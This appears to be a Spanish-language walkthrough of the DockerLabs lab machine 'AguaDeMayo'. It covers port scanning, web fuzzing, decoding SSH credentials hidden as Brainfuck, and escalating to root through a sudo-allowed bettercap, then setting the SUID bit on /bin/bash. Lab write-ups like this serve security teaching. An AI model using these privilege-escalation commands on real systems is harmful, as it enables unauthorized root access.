@@ -1,0 +1,210 @@
+---
+title: AguaDeMayo
+description: Resolución completa de la máquina virtual *AguaDeMayo* de DockerLabs, incluyendo reconocimiento, explotación y escalada de privilegios.
+---
+
+import InfoTable from 'src/components/InfoTable.astro';
+import VulnTable from 'src/components/VulnTable.astro';
+
+## Introducción
+
+Este documento presenta la resolución completa de la máquina **AguaDeMayo**, desarrollada por *The Hackers Labs* para la plataforma **DockerLabs**, clasificada con una dificultad **Fácil**.
+El laboratorio expone un servidor web que contiene código Brainfuck oculto en el código fuente, el cual al ser decodificado revela credenciales de acceso. Además, se encuentra una imagen con un nombre sugerente que refuerza la pista obtenida.
+Con las credenciales obtenidas, se accede al sistema vía SSH como el usuario `Agua`. Una vez dentro, se identifica una configuración insegura de `sudo` que permite ejecutar el binario `bettercap` como root sin autenticación, facilitando una escalada de privilegios mediante la técnica de establecer el bit SUID en `/bin/bash` para obtener acceso completo como `root`.
+Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.
+
+---
+
+## Información Técnica
+
+<InfoTable
+  title=""
+  data={{
+    Nombre: 'AguaDeMayo',
+    Autor: 'The Hackers Labs',
+    Dificultad: 'Fácil',
+    Fecha: '14/05/2024',
+    Plataforma: 'DockerLabs',
+    'IP Objetivo': '172.17.0.2'
+  }}
+/>
+
+---
+
+## Paso 0 — Despliegue y preparación
+
+Se descomprime la máquina y se despliega utilizando el script proporcionado:
+
+```bash
+unzip AguaDeMayo.zip
+sudo bash auto_deploy.sh AguaDeMayo.tar
+```
+
+Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.
+
+![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1762582724/Ip_qrhpof.png)
+
+Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:
+
+```bash
+mkdir -p AguaDeMayo/{content,exploits,nmap,scripts}
+cd AguaDeMayo
+```
+
+---
+
+## Paso 1 — Reconocimiento
+
+### 1.1 Escaneo de puertos
+
+Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:
+
+```bash
+nmap -p- --open -sS --min-rate 5000 -vvv -n 172.17.0.2 -oG allPorts
+extractPorts allPorts
+```
+
+El resultado muestra los siguientes servicios accesibles externamente:
+
+* **22/tcp** — SSH
+* **80/tcp** — HTTP
+
+![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1762631007/Ports_zg6wpx.png)
+
+---
+
+### 1.2 Enumeración de servicios
+
+Se realiza un escaneo detallado de los servicios identificados:
+
+```bash
+nmap -sCV -p22,80 172.17.0.2 -oN targeted
+```
+
+---
+
+### 1.3 Enumeración web
+
+Se realiza un escaneo de directorios para encontrar posibles endpoints en el servicio del puerto 80:
+
+```bash
+ffuf -u "http://172.17.0.2/FUZZ" \
+  -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt \
+  -t 200 -e js,php,txt,html -c -fs 0
+```
+
+Resultados relevantes:
+
+* Página principal (`index`).
+  ![Index](https://res.cloudinary.com/dewqswzke/image/upload/v1762635393/Idex_z78n8n.png)
+* Directorio `/Images`.
+  ![Images](https://res.cloudinary.com/dewqswzke/image/upload/v1762635394/Images_qkoi4s.png)
+
+Al inspeccionar el código fuente de la página principal, se encuentra un bloque de código en lenguaje **Brainfuck**:
+
+```text
+++++++++++[>++++++++++>++++++++++>++++++++++>++++++++++>++++++++++>++++++++++>++++++++++++>++++++++++>+++++++++++>++++++++++++>++++++++++>++++++++++++>++++++++++>+++++++++++>+++++++++++>+>+<<<<<<<<<<<<<<<<<-]>--.>+.>--.>+.>---.>+++.>---.>---.>+++.>---.>+..>-----..>---.>.>+.>+++.>.
+```
+
+Se procede a decodificar el código Brainfuck, obteniendo una pista que revela credenciales de acceso.
+
+![Brainfuck translate](https://res.cloudinary.com/dewqswzke/image/upload/v1762635392/BrainFk_powxpd.png)
+
+Paralelamente, se descarga y analiza la imagen `agua_ssh.jpg` ubicada en `/Images`:
+
+```bash
+wget http://172.17.0.2/Images/agua_ssh.jpg
+exiftool agua_ssh.jpg
+```
+
+No se encuentra información utilizable directamente en los metadatos ni mediante técnicas de esteganografía con contraseñas comunes.
+
+---
+
+## Paso 2 — Explotación (Acceso inicial)
+
+La combinación de pistas (el nombre de la imagen `agua_ssh.jpg` y la salida de la decodificación Brainfuck) indica la existencia de credenciales relacionadas con el servicio SSH.
+
+Con los datos obtenidos, se inicia sesión SSH:
+
+```bash
+ssh agua@172.17.0.2
+```
+
+![SSH login](https://res.cloudinary.com/dewqswzke/image/upload/v1762635396/SSh_zhnld4.png)
+
+---
+
+## Paso 3 — Escalada de privilegios
+
+### 3.1 De agua → root
+
+Una vez dentro como el usuario `Agua`, se verifican los permisos sudo:
+
+```bash
+sudo -l
+```
+
+La salida muestra que `Agua` puede ejecutar `/usr/bin/bettercap` como root sin contraseña.
+
+![Sudo -l](https://res.cloudinary.com/dewqswzke/image/upload/v1762635397/Sudo-l_wgsgeo.png)
+
+El binario `bettercap` es una utilidad que, al ejecutarse con privilegios, permite interacción con el sistema y la ejecución de subcomandos. Se procede a explotarlo:
+
+```bash
+sudo /usr/bin/bettercap
+```
+
+Una vez dentro del contexto con privilegios, se aprovecha la capacidad de ejecutar comandos para establecer el bit SUID sobre `/bin/bash`:
+
+```bash
+chmod +s /bin/bash
+```
+
+Con el bit SUID establecido, se lanza una shell privilegiada preservando los privilegios de root:
+
+```bash
+/bin/bash -p
+```
+
+Se obtiene una shell con UID 0 (root).
+
+![Escalada](https://res.cloudinary.com/dewqswzke/image/upload/v1762635392/Escalade_qp6zca.png)
+![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1762635397/Root_ty8daz.png)
+
+---
+
+## Análisis de Vulnerabilidades
+
+### Fallos de Seguridad Identificados
+
+<VulnTable
+  title=""
+  data={[
+    {
+      vulnerability: "Código Brainfuck con credenciales en código fuente",
+      severity: "Media",
+      impact: "Revelación de credenciales de acceso al sistema"
+    },
+    {
+      vulnerability: "Nombre de archivo sensible en servidor web",
+      severity: "Media",
+      impact: "Indicio que facilita la identificación del vector de ataque"
+    },
+    {
+      vulnerability: "Configuración insegura de sudo en bettercap",
+      severity: "Crítica",
+      impact: "Escalada de privilegios a root mediante ejecución de comandos"
+    },
+    {
+      vulnerability: "Falta de políticas de bloqueo por intentos fallidos",
+      severity: "Media",
+      impact: "Ataques de fuerza bruta ilimitados"
+    },
+    {
+      vulnerability: "Exposición de información sensible en la aplicación web",
+      severity: "Media",
+      impact: "Divulgación de información que puede conducir al compromiso del sistema"
+    }
+  ]}
+/>
